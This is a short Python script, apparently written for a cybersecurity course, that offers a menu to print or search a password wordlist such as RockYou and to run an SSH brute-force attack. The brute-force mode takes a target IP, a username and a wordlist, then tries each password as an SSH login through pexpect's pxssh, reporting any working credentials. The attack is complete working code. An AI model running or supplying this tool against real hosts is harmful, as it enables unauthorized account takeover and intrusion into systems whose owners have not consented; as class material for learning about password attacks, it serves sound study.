#! /usr/bin/env python3
# Script Name:      wewillrockyou
# Author:           marburgja
# Last Rev:         20211025
# Purpose:          List passwords in wordlist/Search wordlist for input
# Sources:          https://www.geeksforgeeks.org/python-how-to-search-for-a-string-in-text-files/
#                   https://github.com/codefellows/seattle-cyber-401d3/blob/main/class-16/challenges/DEMO.md
#                   https://gist.github.com/thewindcolince/d21a45b153f9f5662630fc94afba3bb0


# Libraries
import sys, time, termcolor
from pexpect import pxssh

# Functions
def main():
    while True:
        choice=input("""
        ***We Will RockYou Menu***
1 - Iterate Dictionary/Wordlist
2 - Search Dictionary/Wordlist
3 - Perform Brute-Force Attack
4 - Exit Menu
Please Select Mode:
""")
        if choice=="1":
            iterator()
        elif choice=="2":
            inspector()
            time.sleep(5)
        elif choice=="3":
            brute()
        elif choice=="4":
            break
        else:
            print("Invalid Mode! Try Again.")

def iterator():
    path=input("Enter Path to Wordlist/Dictionary:")
    file=open(path, "r")
    line=file.readline() #reads the lines in the file into variable "line"
    while line:   #reads through the lines of the file and prints them to screen
        line=line.rstrip()
        #word=line   why?
        print(line)
        time.sleep(1)
        line=file.readline()
    file.close()

def inspector():
    path=input("Enter Path to Wordlist/Dictionary:")
    passwd=input("Enter Password For Search:")
    file=open(path, "r")
    flag=0  # sets starting point for the list
    index=0
    for line in file:
        index+=1
        if passwd in line: # if the password matches the current line, break loop
            flag=1
            break

    if flag==1: # if the password was matched above, print confirmation and line number
        print("That Password Was Found!","Line", index)


def connect(host,user,line):
    try:
        ssh=pxssh.pxssh()
        ssh.force_password=True
        ssh.login(host,user,line)
        print("PASSWORD FOUND!!! "+termcolor.colored(user+":"+line,'yellow'))
        sys.exit(0)
    except pxssh.ExceptionPxssh as e: #prints the exception into terminal
        print(e)
    except KeyboardInterrupt as k: #adds keyboard interrupt with response in terminal
        print("\n")
        print("terminate")
        print("raison:program stop by user",)
        sys.exit(0)

def brute():
    s=pxssh.pxssh()
    host=input("Enter IP Address:")
    user=input("Enter Username:")
    path=input("Enter Path To Wordlist/Dictionary:")
    file=open(path, "r", encoding="ISO-8859-1") #opens wordlist for use
    for p in file.readlines(): #goes line by line through wordlist attempting SSH login to selected IP
        username=user.strip("\n")
        password=p.strip("\n")
        print(str(username) + ":" + str(password))
        connect(host,str(username),str(password))
    file.close()

# Main
main()

# End